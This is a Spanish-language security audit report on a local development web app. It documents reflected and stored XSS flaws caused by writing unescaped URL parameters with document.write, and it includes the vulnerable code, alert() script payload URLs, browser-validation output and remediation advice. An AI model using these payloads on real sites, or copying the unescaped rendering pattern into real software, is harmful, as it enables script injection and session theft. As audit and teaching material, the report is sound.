# Informe de auditoria XSS

- Objetivo: `http://web.dev.local:8082`
- Alcance: deteccion y validacion de vulnerabilidades Cross-Site Scripting (XSS)
- Estado: vulnerable

## Resumen ejecutivo

Se confirmaron dos vulnerabilidades XSS con ejecucion real de JavaScript en navegador:

1. XSS reflejado en el parametro `search`.
2. XSS almacenado en los parametros `name` y `comment`, persistidos en `localStorage` y renderizados despues en la pagina principal.

La aplicacion inserta datos controlados por el usuario en el DOM mediante `document.write(...)` sin ningun tipo de escape o sanitizacion. Esto permite ejecutar JavaScript arbitrario en el navegador de cualquier usuario que visite una URL maliciosa o cargue comentarios previamente almacenados.

## Metodologia

- Inspeccion del HTML y JavaScript servido por la aplicacion.
- Identificacion de parametros de entrada y sinks DOM inseguros.
- Validacion en navegador real con `puppeteer`.
- Explotacion controlada mediante payloads `alert()` para demostrar ejecucion.

## Hallazgos

### 1. XSS reflejado en `search`

**Tipo:** Reflected XSS  
**Parametro afectado:** `search`  
**Severidad:** Alta

#### Evidencia tecnica

La pagina procesa el valor de `search` desde `window.location.search` y lo inserta directamente con:

```javascript
const urlParams = new URLSearchParams(window.location.search);
const searchTerm = urlParams.get('search');

if (searchTerm) {
    document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
}
```

Al no escaparse el contenido, cualquier HTML/JavaScript inyectado se interpreta en el navegador.

#### PoC

```text
http://web.dev.local:8082/?search=%3Cscript%3Ealert(%22REFLECTED_XSS%22)%3C%2Fscript%3E
```

#### Resultado observado

La validacion en navegador mostro el dialogo JavaScript:

```text
REFLECTED_XSS
```

### 2. XSS almacenado en comentarios (`name` y `comment`)

**Tipo:** Stored XSS  
**Parametros afectados:** `name`, `comment`  
**Severidad:** Critica

#### Evidencia tecnica

La pagina toma `name` y `comment` desde la URL, los almacena en `localStorage` y luego los vuelve a pintar con `document.write(...)`:

```javascript
const name = urlParams.get('name');
const comment = urlParams.get('comment');

if (name && comment) {
    let comments = JSON.parse(localStorage.getItem('comments') || '[]');
    comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
    localStorage.setItem('comments', JSON.stringify(comments));
    window.location.href = window.location.pathname;
}
```

Posteriormente:

```javascript
comments.forEach(function(c) {
    document.write('<div class="comment-author">' + c.name + '</div>');
    document.write('<div>' + c.comment + '</div>');
});
```

Esto permite persistir codigo JavaScript y ejecutarlo cada vez que se cargan los comentarios.

#### PoC

```text
http://web.dev.local:8082/?name=attacker&comment=%3Cscript%3Ealert(%22STORED_XSS%22)%3C%2Fscript%3E
```

#### Resultado observado

1. El payload se guardo en `localStorage` bajo la clave `comments`.
2. La pagina redirigio a la URL limpia `/`.
3. Al renderizar los comentarios almacenados, se ejecuto `alert("STORED_XSS")`.

Valor observado en almacenamiento:

```json
[{"name":"attacker","comment":"<script>alert(\"STORED_XSS\")</script>","date":"4/20/2026, 12:30:33 PM"}]
```

## Cabeceras y defensas observadas

La respuesta HTTP no expone una `Content-Security-Policy`, lo que incrementa el impacto de la explotacion XSS:

```http
HTTP/1.1 200 OK
Server: Apache/2.4.65 (Unix)
Content-Type: text/html
```

## Evidencia de explotacion

Validacion en navegador real mediante `puppeteer`:

```text
DIALOG:REFLECTED_XSS
REFLECTED_SEEN=true
DIALOG:STORED_XSS
STORED_SEEN=true
```

## Impacto

Un atacante podria:

- Ejecutar JavaScript arbitrario en el navegador de la victima.
- Robar tokens, datos de sesion o informacion visible en la pagina.
- Modificar la interfaz para phishing o robo de credenciales.
- Mantener una carga persistente mediante comentarios almacenados.

## Recomendaciones

1. Eliminar `document.write(...)` para datos controlados por el usuario.
2. Insertar contenido no confiable usando `textContent`, `innerText` o nodos DOM seguros.
3. Escapar o sanitizar correctamente todos los datos antes de renderizarlos.
4. Validar y normalizar entradas en cliente y servidor.
5. Implementar una `Content-Security-Policy` restrictiva.
6. Evitar almacenar HTML no confiable en `localStorage` sin codificacion o escape.

## Conclusion

El objetivo `http://web.dev.local:8082` es vulnerable a XSS reflejado y almacenado. Ambas vulnerabilidades fueron explotadas de forma controlada y se confirmo la ejecucion de JavaScript arbitrario en el navegador.
